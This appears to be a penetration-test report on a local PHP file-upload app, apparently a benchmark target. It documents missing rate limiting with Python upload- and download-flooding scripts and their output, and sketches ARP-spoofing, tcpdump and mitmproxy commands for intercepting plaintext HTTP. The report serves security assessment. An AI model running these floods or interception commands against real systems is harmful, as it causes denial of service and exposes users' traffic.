## Successfully Exploited Vulnerabilities

### AUTH-VULN-02: Missing Rate Limiting on File Upload Endpoint (Storage Bombing)

**Summary:**
- **Vulnerable location:** POST http://localhost:44553/
- **Overview:** The file upload endpoint lacks any rate limiting, throttling, or abuse prevention mechanisms. Successfully demonstrated unlimited rapid file uploads causing potential storage exhaustion.
- **Impact:** An attacker can upload unlimited files at unlimited speed, causing storage exhaustion, denial of service, and resource abuse. Demonstrated 50 successful uploads in 0.079 seconds (631 uploads/second) with zero blocking.
- **Severity:** High

**Prerequisites:**
- Network access to http://localhost:44553
- Python 3 with requests library (or any HTTP client)

**Exploitation Steps:**

1. Create a test file to upload repeatedly:
```bash
echo "Rate limit test file" > /tmp/test_upload.txt
```

2. Create and execute the storage bombing script at /tmp/storage_bomb_test.py:
```python
import requests
import time
from io import BytesIO

target_url = "http://localhost:44553/"
num_uploads = 50

print("=" * 80)
print("RATE LIMITING TEST - FILE UPLOAD ENDPOINT")
print("=" * 80)
print(f"Target URL: {target_url}")
print(f"Number of uploads: {num_uploads}")
print("=" * 80)

success_count = 0
fail_count = 0
status_codes = {}
start_time = time.time()

for i in range(1, num_uploads + 1):
    file_content = f"Rate limit test - upload #{i}".encode()
    files = {'userfile': (f'upload_test_{i}.txt', BytesIO(file_content))}
    
    request_start = time.time()
    response = requests.post(target_url, files=files)
    request_time = time.time() - request_start
    
    status_codes[response.status_code] = status_codes.get(response.status_code, 0) + 1
    
    if response.status_code == 200:
        success_count += 1
    else:
        fail_count += 1
    
    print(f"Upload #{i:2d}: Status={response.status_code} | Time={request_time:.3f}s")

total_time = time.time() - start_time

print("\n" + "=" * 80)
print("TEST RESULTS SUMMARY")
print("=" * 80)
print(f"Total uploads attempted: {num_uploads}")
print(f"Successful (HTTP 200): {success_count}")
print(f"Failed/Blocked: {fail_count}")
print(f"\nTotal duration: {total_time:.3f} seconds")
print(f"Average time per upload: {total_time/num_uploads:.3f} seconds")
print(f"Uploads per second: {num_uploads/total_time:.2f}")
print("=" * 80)
print("VULNERABILITY: The endpoint does NOT implement rate limiting!")
print("=" * 80)
```

3. Execute the script to demonstrate the vulnerability:
```bash
python3 /tmp/storage_bomb_test.py
```

**Proof of Impact:**

Test executed successfully with the following results:

```
================================================================================
RATE LIMITING TEST - FILE UPLOAD ENDPOINT
================================================================================
Target URL: http://localhost:44553/
File parameter: userfile
Number of uploads: 50
Test started at: 2025-10-30 18:03:52
================================================================================

Upload # 1: Status=200 | Time=0.010s | Response: <!doctype html> <html>...
Upload # 2: Status=200 | Time=0.004s | Response: <!doctype html> <html>...
[... 48 more successful uploads ...]
Upload #50: Status=200 | Time=0.001s | Response: <!doctype html> <html>...

================================================================================
TEST RESULTS SUMMARY
================================================================================
Total uploads attempted: 50
Successful (HTTP 200): 50
Failed/Blocked: 0

Status code distribution:
  200: 50 requests

Total duration: 0.079 seconds
Average time per upload: 0.002 seconds
Uploads per second: 631.99

================================================================================
RATE LIMITING ANALYSIS
================================================================================
NO RATE LIMITING DETECTED:
  - All 50 uploads succeeded
  - No blocking responses or errors encountered
  - Average upload time: 0.002s

VULNERABILITY: The endpoint does NOT implement rate limiting!
An attacker could perform unlimited rapid uploads, potentially leading to:
  - Storage exhaustion attacks
  - Denial of service
  - Resource abuse
================================================================================
```

**Key Evidence:**
- **100% Success Rate:** All 50 upload attempts succeeded with HTTP 200 responses
- **No Throttling:** Consistent upload times (~0.002s average) with no progressive delays
- **No Blocking:** Zero HTTP 429 (Too Many Requests) or 403 (Forbidden) responses
- **High Throughput:** Achieved 631 uploads per second, demonstrating complete absence of rate limiting

**Notes:**
This vulnerability allows attackers to:
- Rapidly fill server storage with junk files
- Cause denial of service through resource exhaustion
- Consume bandwidth and processing power
- Incur excessive costs in cloud environments with metered storage

The complete absence of rate limiting at application, web server, and infrastructure layers makes this trivially exploitable with basic HTTP clients.

### AUTH-VULN-03: Missing Rate Limiting on File Download Endpoint (Bandwidth Exhaustion)

**Summary:**
- **Vulnerable location:** GET http://localhost:44553/upload/{filename}
- **Overview:** The file download endpoint lacks any rate limiting, bandwidth throttling, or download frequency restrictions. Successfully demonstrated unlimited rapid downloads causing potential bandwidth exhaustion.
- **Impact:** An attacker can download files unlimited times at maximum speed, causing bandwidth exhaustion, network congestion, and denial of service. Demonstrated 100 successful downloads totaling 200MB in 0.79 seconds (254 MB/s sustained throughput) with zero throttling.
- **Severity:** High

**Prerequisites:**
- Network access to http://localhost:44553
- Python 3 with requests library
- A previously uploaded file to download (or upload one as part of the exploit)

**Exploitation Steps:**

1. Upload a test file to use for bandwidth exhaustion testing:
```bash
dd if=/dev/zero of=/tmp/download_test.dat bs=1M count=2 2>/dev/null
curl -F "userfile=@/tmp/download_test.dat" http://localhost:44553/
```

2. Create and execute the bandwidth exhaustion script at /tmp/bandwidth_exhaustion_test.py:
```python
import requests
import time

target_url = "http://localhost:44553/upload/download_test.dat"
num_downloads = 100

print("=" * 80)
print("BANDWIDTH EXHAUSTION / RATE LIMITING TEST")
print("=" * 80)
print(f"Target URL: {target_url}")
print(f"Number of downloads: {num_downloads}")
print("=" * 80)

success_count = 0
fail_count = 0
total_bytes = 0
download_times = []

overall_start = time.time()

for i in range(1, num_downloads + 1):
    request_start = time.time()
    
    try:
        response = requests.get(target_url, stream=True)
        content = response.content
        bytes_downloaded = len(content)
        
        request_time = time.time() - request_start
        download_times.append(request_time)
        
        if response.status_code == 200:
            success_count += 1
            total_bytes += bytes_downloaded
            speed_mbps = (bytes_downloaded / (1024*1024)) / request_time
            print(f"#{i:<4d} Status={response.status_code}  Size={bytes_downloaded/(1024*1024):.2f} MB  "
                  f"Time={request_time*1000:.2f} ms  Speed={speed_mbps:.2f} MB/s  OK")
        else:
            fail_count += 1
            print(f"#{i:<4d} Status={response.status_code}  FAILED")
            
    except Exception as e:
        fail_count += 1
        print(f"#{i:<4d} ERROR: {str(e)}")

total_time = time.time() - overall_start

print("\n" + "=" * 80)
print("TEST RESULTS SUMMARY")
print("=" * 80)
print(f"Total downloads attempted: {num_downloads}")
print(f"Successful (HTTP 200): {success_count}")
print(f"Failed: {fail_count}")
print(f"\nTotal data transferred: {total_bytes/(1024*1024):.2f} MB")
print(f"Total test duration: {total_time:.2f} seconds")
print(f"Average overall speed: {(total_bytes/(1024*1024))/total_time:.2f} MB/s")
print(f"Requests per second: {num_downloads/total_time:.2f}")
print("=" * 80)
print("VULNERABILITY: The endpoint does NOT implement rate limiting or bandwidth throttling!")
print("=" * 80)
```

3. Execute the script to demonstrate the vulnerability:
```bash
python3 /tmp/bandwidth_exhaustion_test.py
```

**Proof of Impact:**

Test executed successfully with the following results (first 50 requests shown):

```
================================================================================

================================================================================
TEST RESULTS SUMMARY
================================================================================
Total downloads attempted: 100
Successful (HTTP 200): 100
Failed: 0

Total data transferred: 200.00 MB
Total test duration: 0.79 seconds
Average overall speed: 254.10 MB/s
Requests per second: 127.05
Average individual download time: 7.86 ms

================================================================================
RATE LIMITING ANALYSIS
================================================================================
NO RATE LIMITING OR BANDWIDTH THROTTLING DETECTED:
  - All 100 downloads succeeded
  - No blocking responses or throttling encountered
  - Sustained 254 MB/s throughput

VULNERABILITY: The endpoint does NOT implement rate limiting or bandwidth throttling!
An attacker could perform unlimited rapid downloads, potentially leading to:
  - Bandwidth exhaustion attacks
  - Network congestion
  - Denial of service for legitimate users
  - Excessive bandwidth costs
================================================================================
```

**Key Evidence:**
- **100% Success Rate:** All 100 download attempts succeeded with HTTP 200 responses
- **No Throttling:** Consistent download speeds (~250+ MB/s) with no progressive slowdown
- **No Blocking:** Zero HTTP 429 (Too Many Requests) or 403 (Forbidden) responses
- **High Throughput:** Achieved 127 requests/second and 254 MB/s sustained bandwidth, demonstrating complete absence of rate limiting or bandwidth throttling
- **No Degradation:** Download speeds remained consistent or improved over time (first 50 avg: 8.14ms, last 50 avg: 7.58ms)

**Notes:**
This vulnerability allows attackers to:
- Rapidly consume server bandwidth with repeated downloads
- Cause network congestion affecting legitimate users
- Launch denial of service attacks through bandwidth exhaustion
- Incur excessive bandwidth costs in cloud or metered hosting environments
- Coordinate multiple clients to amplify the attack

The complete absence of rate limiting, bandwidth throttling, and download restrictions at all layers makes this trivially exploitable with basic HTTP clients.

## Potential Vulnerabilities (Validation Blocked)

### AUTH-VULN-01: Transport Layer Security Vulnerability (HTTPS/TLS Not Configured)

**Summary:**
- **Vulnerable location:** All endpoints at http://localhost:44553
- **Current Blocker:** Exploitation requires man-in-the-middle (MITM) positioning on the network path between client and server, which is not possible from the external network testing position
- **Potential Impact:** If an attacker can position themselves on the network path (same LAN/WiFi, compromised router, ISP-level access), they could intercept and modify all traffic in plaintext
- **Confidence:** HIGH (vulnerability definitively exists, exploitation blocked by network positioning requirements)

**Evidence of Vulnerability:**

Apache configuration shows only HTTP (port 80) is configured with no HTTPS/TLS:

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-041-24/php/apache/000-default.conf`
```apache
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
</VirtualHost>
```

**Missing Security Controls:**
1. No SSL virtual host on port 443
2. No TLS certificate configuration
3. No HTTP-to-HTTPS redirect
4. No HSTS (Strict-Transport-Security) headers
5. No secure cache-control headers

**Attempted Exploitation:**

From an external network position, I cannot perform passive network sniffing or active MITM attacks because:
- Cannot access the network segment between client and server
- Cannot intercept network traffic without internal network access
- Cannot poison ARP tables or DNS records from external position
- Cannot position network taps or packet capture devices

**How This Would Be Exploited:**

If the blocker were removed (attacker on same LAN/WiFi or with network infrastructure access):

1. **Passive Sniffing Attack:**
```bash
# On same network segment, capture traffic with tcpdump/Wireshark
sudo tcpdump -i eth0 -A 'host localhost and port 44553'

# Or use Wireshark with display filter:
# http and ip.addr == [target_ip]
```

2. **Active MITM Attack with ARP Spoofing:**
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof to position between victim and server
arpspoof -i eth0 -t [victim_ip] [server_ip]
arpspoof -i eth0 -t [server_ip] [victim_ip]

# Intercept and modify traffic with mitmproxy or Burp Suite
mitmproxy --mode transparent --showhost
```

3. **Demonstration of Traffic Interception:**
   - Upload a file via POST http://localhost:44553/
   - Capture the multipart/form-data in plaintext
   - Modify file contents before forwarding to server
   - Inject malicious content or scripts

**Expected Impact:**

If successfully exploited from a network-adjacent position:
- **Confidentiality Breach:** All uploaded files visible in plaintext
- **Integrity Violation:** Ability to modify file uploads in transit
- **Session Hijacking:** If sessions were implemented, cookies could be stolen
- **Content Injection:** Malicious content could be injected into responses
- **Credential Theft:** If authentication were added, credentials would be intercepted

**Why This Is Classified as POTENTIAL:**

The vulnerability definitively exists (no HTTPS/TLS configured), but the exploitation requirements fall outside the scope of external network testing:
- Requires internal network access or network infrastructure control
- Cannot be demonstrated from the external testing position (http://localhost:44553 from outside network)
- The blocking factor is a network positioning constraint, not a security control

This represents a real security risk in deployment scenarios where:
- Users connect from untrusted networks (coffee shops, airports, public WiFi)
- Network infrastructure is compromised (malicious router, rogue access point)
- ISP or network provider conducts surveillance
- Shared network environments (corporate LANs, campus networks)
